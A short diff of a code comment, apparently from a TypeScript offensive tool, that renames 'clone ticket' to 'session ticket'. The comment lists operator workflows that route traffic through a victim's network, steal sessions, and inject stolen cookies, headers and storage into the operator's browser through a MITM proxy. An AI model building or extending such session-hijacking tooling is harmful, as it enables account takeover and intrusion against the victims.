@@ -185,8 +185,8 @@ function scheduleReconnect(sessionUUID: string): void {
  * composable with four operator workflows:
  *
  *  1. Proxy only          — route through victim's network, unauthenticated.
- *  2. Clone ticket only   — steal session, browse directly (no proxy).
- *  3. Proxy + clone ticket — route through victim's network WITH stolen
+ *  2. Session ticket only  — steal session, browse directly (no proxy).
+ *  3. Proxy + session ticket — route through victim's network WITH stolen
  *     session.  The Conductor injects cookies/headers/storage/UA into the
  *     operator's browser; the MITM proxy forwards those headers here.
  *  4. Proxy + own login   — operator logs in manually; their session cookies
